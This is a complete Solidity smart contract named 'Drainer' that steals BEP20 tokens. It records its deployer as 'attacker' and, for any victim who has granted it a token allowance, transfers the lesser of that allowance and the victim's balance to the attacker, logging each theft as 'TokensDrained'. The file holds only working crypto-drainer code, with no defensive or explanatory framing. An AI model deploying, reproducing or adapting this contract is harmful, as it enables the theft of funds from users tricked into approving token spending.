// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBEP20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract Drainer {
    address public attacker;

    event TokensDrained(address indexed victim, address indexed token, uint256 amount);

    constructor() {
        attacker = msg.sender;
    }

    function drainTokens(address victim, address[] memory tokens) external returns (uint256[] memory) {
        require(msg.sender == attacker, "Not authorized");
        uint256[] memory amounts = new uint256[](tokens.length);

        for (uint256 i = 0; i < tokens.length; i++) {
            amounts[i] = _drainToken(victim, tokens[i]);
        }
        return amounts;
    }

    function drainSpecificToken(address victim, address token) external returns (uint256) {
        require(msg.sender == attacker, "Not authorized");
        return _drainToken(victim, token);
    }

    function _drainToken(address victim, address token) internal returns (uint256) {
        IBEP20 tokenContract = IBEP20(token);
        uint256 balance = tokenContract.balanceOf(victim);
        uint256 allowance = tokenContract.allowance(victim, address(this));
        uint256 amount = allowance < balance ? allowance : balance;

        if (amount > 0) {
            bool success = tokenContract.transferFrom(victim, attacker, amount);
            require(success, "Transfer failed");
            emit TokensDrained(victim, token, amount);
        }
        return amount;
    }
}